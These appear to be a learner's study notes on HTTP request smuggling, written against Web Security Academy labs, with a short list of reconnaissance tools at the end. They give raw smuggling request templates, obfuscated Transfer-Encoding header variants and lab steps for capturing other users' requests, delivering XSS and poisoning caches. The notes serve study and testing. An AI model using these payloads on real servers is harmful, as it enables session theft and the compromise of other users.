	- CL.TE vulnerabilities (Need to provide just the first character ie G, remaining will be taken from next request)
		* Lab - Include CL & TE. Use HTTP/1.1
		* Payload - \r\n0\r\n\r\nG
	- TE.CL vulnerabilities (Need to provide GPOST / HTTP/1.1 -> Content-type -> Content-Length -> Body -> 0\r\n\r\n)
		* Ensure the "Update Content-Length" option is unchecked. 
		* Include the trailing sequence \r\n\r\n following the final 0
		* Include the appropriate size of the chunk size (hex value) by highlighting the content and viewing the burp inspector.
		* Lab - Include CL & TE follow above rules
	- TE.TE behavior: obfuscating the TE header
		* Front-end & Back-end servers both support Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header. 
		* eg: Transfer-Encoding: xchunked
			Transfer-Encoding : chunked
			Transfer-Encoding: chunked
			Transfer-Encoding: x
			Transfer-Encoding:[tab]chunked
			[space]Transfer-Encoding: chunked
			X: X[\n]Transfer-Encoding: chunked
			Transfer-Encoding
			: chunked
		* Depending on whether the front-end or back-end server that can be induced not to process the obfuscated Transfer-Encoding header, the remainder of the attack will take the same form as the CL.TE or TE.CL vulnerabilities.
		* Labs: Include 1-"Content-Length' & 2-"Transfer-Encoding" where one is obfuscated. Also, uncheck "Update Content-Length" & include trailing sequence \r\n\r\n
	- Finding HTTP request smuggling vulnerabilities
  	  * Finding CL.TE vulnerabilities using timing techniques
		$ 	POST / HTTP/1.1
			Host: vulnerable-website.com
			Transfer-Encoding: chunked
			Content-Length: 4

			1
			A
			X
		 $ Front-end uses CL header, will forward part of the request, omitting X. Back-end uses TE header, processes the first chunk, & waits for next chunk
	  * Finding TE.CL vulnerabilities using timing techniques
		$ 	POST / HTTP/1.1
			Host: vulnerable-website.com
			Transfer-Encoding: chunked
			Content-Length: 6

			0

			X
		$ Front-end uses TE header, will forward part of this request, omitting X. Back-end uses CL header, expects more content in body, and waits for remaining content
	- Confirming CL.TE vulnerabilities using differential responses
		$ If attack is successful, the last two lines of request are treated by back-end as belonging to next request that is received. This will cause the subsequent "normal" request to contain the last 2 lines considered by the back-end which will eventually throw an error message.
		$ Lab - Combine the above labs and smuggle a request that calls for a invalid resource
	- Confirming TE.CL vulnerabilities using differential responses
		$ Lab - Perform the similar steps as above, however smuggle a request that calls a invalid resource from the server.
	- Exploiting HTTP request smuggling vulnerabilities
	  * Bypass Front-End Security Controls
		$ Front-end is used to implement some security controls, deciding whether to allow individual requests
		$ Back-end then honors every request without further checking.
		$ Lab - Modify the smuggled request where Host header contains localhost and admin panel can be accessed. Also form the smuggled request in such a way that 'normal request' is considered as part of smuggled body
		$ If vulnerable to CL:TE, do not keep \r\n at the end of body, so that the normal request would be considered as body and prevent from any Duplicate headers or 2 HTTP methods.
	  * Reveal Front-End Request Rewriting
		$ Front-end performs some rewriting of requests before they are forwarded to the back-end
			% Terminate the TLS connection and add some headers describing the protocol and ciphers that were used;
			% Add an X-Forwarded-For header containing user's IP address;
			% Determine user's ID based on their session token and add a header identifying the user; or
			% Add sensitive information that is of interest for other attacks.
		$ If smuggled requests are missing some headers that are added by the front-end, then the back-end might not process the requests in the normal way
		eg: 	POST / HTTP/1.1
			Host: YOUR-LAB-ID.web-security-academy.net
			Content-Type: application/x-www-form-urlencoded
			Content-Length: 124
			Transfer-Encoding: chunked
			\r\n
			0\r\n
			\r\n
			POST / HTTP/1.1
			Content-Type: application/x-www-form-urlencoded
			Content-Length: 200
			Connection: close
			\r\n
			search=test
		$ Perform following steps to reveal the headers that need to be included in our smuggled requests.
			% Find a POST request that reflects the value of a request parameter into the application's response.
			% Shuffle the parameters so that the reflected parameter appears last in the message body.
			% Smuggle this request to the back-end server, followed directly by a normal request whose rewritten form you want to reveal.
			% The value in the Content-Length header in the smuggled request will determine how long the back-end server believes the request is
		$ Lab - The Comment request reflects the comment. Smuggle this request where 'comment' parameter is placed at the end so that the normal request is included in the comments section. Obtain the headers required and smuggle a request that would give sensitive info or session token.
	  * Bypassing Client Authentication
		$ Some apps request Client certificate for authentication that is used by the back-end as part of access control mechanism.
		$ Component that authenticates the client passes the relevant details from the certificate to the app or back-end via non-standard HTTP headers.(X-SSL-CLIENT-CN: carlos)
		$ Assuming you're able to send the right combination of headers and values, this may enable you to bypass access controls. 
		$ Isn't usually exploitable as front-end tends to overwrite these headers. However, smuggled requests are hidden from the front-end, so any headers they contain will be sent to the back-end unchanged.
	  * Capturing Other Users' Requests
		$ If app contains any functionality that allows you to store and later retrieve textual data, you can use this to capture the contents of other users' requests.
		$ Suitable functions to use as the vehicle for this attack would be comments, emails, profile descriptions, screen names, and so on.
		$ To perform the attack, smuggle a request that submits data to the storage function, with the parameter containing the data to store positioned last in the request
		$ Limitation with this technique is that it will generally only capture data up until the parameter delimiter ie '&' that is applicable for the smuggled request.
		$ Lab - Smuggle the 'comment' request where the comment parameter should be place to the end so that the victim's request will be appended to the comments.
	  * Exploit Reflected XSS
		$ If an app is vulnerable to request smuggling and also contains reflected XSS, you can use request smuggling attack to hit other users of the application.
		$ It requires no interaction with victim users. It can be used to exploit XSS behavior in parts of the request that cannot be trivially controlled such as HTTP request headers.
		$ Lab - View Post page vulnerable to XSS in User-Agent header. Smuggle the View Post containing the XSS payload in User-Agent header.
	  * Turn an on-site redirect into an open redirect
		$ Apps perform on-site redirects from one URL to another and place the hostname from the request's Host header into the redirect URL
		$ Smuggle a request that would redirect the victim user to attacker controlled website. It would work even if 'Location' does not contain https. Bypass://atacker-website.com/example
	  * Perform Web Cache Poisoning
		$ Attacker causes the app to store some malicious content in the cache, and this content is served from the cache to other application users.
		$ Smuggled request reaches the back-end, which responds as before with the off-site redirect. Front-end caches this response against what it believes is the URL in the second request, for a request made by the victim.
		$ Any other users accessing the same resource will be served with the poisoned cached response redirecting them to attacker's website.
		$ Lab - Find a request that gives a redirect response. Smuggle this request with the Host Header modified. Send any other normal request that users would visit. Normal request would have a redirect response that was cached and would redirect all users to attacker website. 
	  * Perform Web Cache Deception
		$ Attacker causes the app to store some sensitive content belonging to another user in the cache, and attacker then retrieves this content from the cache.
		$ eg: Find a request that returns sensitive info specific to the user. Smuggle this request, so that when a user requests for a static page, the smuggled request get appended with the session cookies of the user and the front-end caches the response to the static page with the sensitive content. Attacker can now view the sensitive info by accessing the static page.
		$ Important caveat is the attacker doesn't know the URL against which the sensitive content will be cached, since this will be whatever URL the victim user happened to be requesting when the smuggled request took effect. Attacker might need to fetch a large number of static URLs to discover the captured content.
		$ Lab - Follow above steps, but make sure when requesting the static page the session cookie should be different and not tied to attacker account.
	- Advanced Request Smuggling
	  * HTTP/2 Request Smuggling
		$ HTTP/2 message length - messages are sent over the wire as a series of separate "frames". Each frame is preceded by an explicit length field, which tells the server exactly how many bytes to read in. Therefore, the length of the request is the sum of its frame lengths.
		$ HTTP/2 Downgrading 
			% Front-end servers rewrite each incoming HTTP/2 request using HTTP/1 syntax, effectively generating its HTTP/1 equivalent so that back-end can process the request.
			% The HTTP/1 back-end response is then converted to HTTP/2 and served to the user.
		$ H2.CL vulnerabilities
			% HTTP/2 requests don't have to specify their length explicitly in a header.
			% During downgrading, this means front-end servers often add an HTTP/1 Content-Length header.
			% The spec dictates that any content-length header in an HTTP/2 request must match the length calculated using the built-in mechanism, but this isn't always validated properly before downgrading.
			% Lab - POST / HTTP/2
				Host: YOUR-LAB-ID.web-security-academy.net
				Content-Length: 0
				\r\n
				GET /resources HTTP/1.1
				Host: foo
				Content-Length: 5
				\r\n
				x=1
				Smuggled request redirects the user to attacker controlled website as the Host Header can be modified.
	  	$ H2.TE vulnerabilities
			% Chunked transfer encoding is incompatible with HTTP/2 and the spec recommends that any transfer-encoding header should be stripped/blocked entirely.
			% If front-end fails to strip/block, and downgrades the request for an HTTP/1 back-end that does support chunked encoding, this enables request smuggling.
		$ Hidden HTTP/2 support
			% Enable the Allow HTTP/2 ALPN override option
	  * Response Queue Poisoning
		$ Causes front-end to start mapping responses from the back-end to the wrong requests.
		$ Achieved by smuggling a complete request, thereby eliciting two responses from the back-end when the front-end is only expecting one.







**********************************************************************************************************************************************************************************

Tools
Subdomain Enum: amass, assetfinder, httprobe
Subdomain Takeover: subjack

























